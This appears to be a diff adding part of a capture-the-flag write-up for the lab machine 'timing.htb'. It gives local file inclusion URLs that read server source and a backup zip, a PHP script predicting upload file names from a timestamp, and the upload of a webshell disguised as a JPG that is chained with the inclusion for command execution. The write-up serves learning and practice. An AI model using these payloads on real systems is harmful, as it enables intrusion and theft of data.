@@ -284,3 +284,181 @@ Boom we are good now we have access to the admin panel and we have an upload pag
 
 ![image](https://user-images.githubusercontent.com/69868171/148077767-e6dabd53-3bc9-456f-a659-5845d43bcffe.png)
 
+I quickly try to upload a php file to get a reverse shell but it was a dead end i got error.
+
+![image](https://user-images.githubusercontent.com/69868171/148078516-4ef64e8a-7510-4a7c-bb27-44130abde6f0.png)
+
+Ahhhhhhhhhh let check the `upload.php` source code which we got with the `LFI` .
+
+```
+http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php
+```
+
+```
+<?php
+include("admin_auth_check.php");
+
+$upload_dir = "images/uploads/";
+
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+
+$file_hash = uniqid();
+
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+if (isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if ($check === false) {
+        $error = "Invalid file";
+    }
+}
+
+// Check if file already exists
+if (file_exists($target_file)) {
+    $error = "Sorry, file already exists.";
+}
+
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed.";
+}
+
+if (empty($error)) {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file has been uploaded.";
+    } else {
+        echo "Error: There was an error uploading your file.";
+    }
+} else {
+    echo "Error: " . $error;
+}
+?>
+```
+
+Now let me break the php code below down to make it more clear to you bruhh don't worry i know you are reading i got you man.
+
+```
+$upload_dir = "images/uploads/";    /// We Know that the upload directory anything we upload got store there
+
+```
+
+```
+$file_hash = uniqid();
+
+$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $upload_dir . $file_name;
+$error = "";
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+if (isset($_POST["submit"])) {
+    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if ($check === false) {
+        $error = "Invalid file";
+    }
+}
+
+```
+
+We all know all file has a special md5 hash right so our file got uploaded and the file md5 hash would got use to rename our file and the time it got uploaded with the name we use to save our file last between it also check the image size.
+
+```
+if ($imageFileType != "jpg") {
+    $error = "This extension is not allowed."; //// We know now that only jpg file is allow to be uploaded
+```
+
+```
+if (empty($error)) {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file has been uploaded.";
+    } else {
+        echo "Error: There was an error uploading your file.";
+    }
+ ```
+ 
+Surely if we upload a jpg file we should get oue file uploaded without no error.
+
+
+![image](https://user-images.githubusercontent.com/69868171/148082254-f1ba3a09-9932-4a02-9327-baa696642a47.png)
+
+Uploaded but we know our file has been rename so we can't access it with `shell.jpg` let confirm it.
+
+![image](https://user-images.githubusercontent.com/69868171/148082709-ed61944e-ce9b-4702-87c7-4afaa2406491.png)
+
+Now you get what am talking about so let quickly write a php code that can help us with that but we need to get the time our file got uploaded first so let intercept it with burp suite.
+
+![image](https://user-images.githubusercontent.com/69868171/148083729-021ec90d-39a7-418f-87ae-d419f0f9a5e8.png)
+
+Send to burp repeater.
+
+![image](https://user-images.githubusercontent.com/69868171/148083817-2820894a-16d8-4c22-b352-6e17559d2729.png)
+
+Let send it and the file got uploaded and we have the date now let convert it to unix timestamp using `cyberchef` .
+
+![image](https://user-images.githubusercontent.com/69868171/148084157-0f311e35-8d40-4d5a-b17f-04c5373ba457.png)
+
+Now let add the unix timestamp to our php code that we just wrote.
+
+```
+// save in a file name time.php //
+
+<?php
+$upload_dir = "images/uploads/";
+$file = "minion.jpg";
+
+while(true){
+    $file_name = md5('$file_hash'. 1641310558) . '_' . $file;
+    $target_file = $upload_dir . $file_name;
+    echo $file_name;
+    echo PHP_EOL;
+    sleep(1);
+}
+```
+
+Now let run it to get the file name.
+
+![image](https://user-images.githubusercontent.com/69868171/148085261-8c25be4a-d172-4cd3-8dd8-15e12cb0e136.png)
+
+Boom we got it let confirm it now.
+
+![image](https://user-images.githubusercontent.com/69868171/148085465-6dc93fb3-d594-427f-b1c4-9693225b6738.png)
+
+It perfection lol now that we can get the file name we uploaded let try to upload a php script which we can be use to execute a command we can chain it with the `LFI` to access it so we can execute any command we want on the system also we notice upload page content-type is not being check on the header so we can change it to `application/x-php` .
+
+The one i use is `https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php` i download it and rename it to `shell.jpg` upload and intercept it.
+
+![image](https://user-images.githubusercontent.com/69868171/148087267-cdb1685f-c35d-42b5-aa50-436ad7df97b6.png)
+
+I think you already know how to get the file name so it should be easy now let access it with the `LFI` yes i know we are chaining it lol.
+
+```
+http://timing.htb/image.php?img=images/uploads/efa58f2dd075e9ffa77ee72e8d8408f2_shell.jpg
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148087719-d196d6e3-a762-4b59-9e6b-3028e54519b4.png)
+
+Boom now let try to execute a command.
+
+![image](https://user-images.githubusercontent.com/69868171/148087864-f6559e32-8af6-4498-98ab-36b0e60db055.png)
+
+Now we are good so i try some many thing to get a reverse shell back to my terminal but it was all dead end so i started enumerating manually lucky me i found a zip file under `/opt` .
+
+![image](https://user-images.githubusercontent.com/69868171/148088310-e7c95f1a-fad1-486e-ba83-450f89cca09e.png)
+
+Interesting let get the zip file using the `LFI` again i know you are tired but imagine the fun you are having now hehehehe.
+
+```
+http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/opt/source-files-backup.zip
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148089022-5f9a4e4f-bd06-4c4b-b5e3-3bc2b346eb84.png)
+
+
+Now we just need to decode the base64 to file and we have the zip file easy right? .
+
+![image](https://user-images.githubusercontent.com/69868171/148090548-a0544a00-d3d6-4079-b5ba-e2d191973544.png)
+
+Now let download it and unzip 
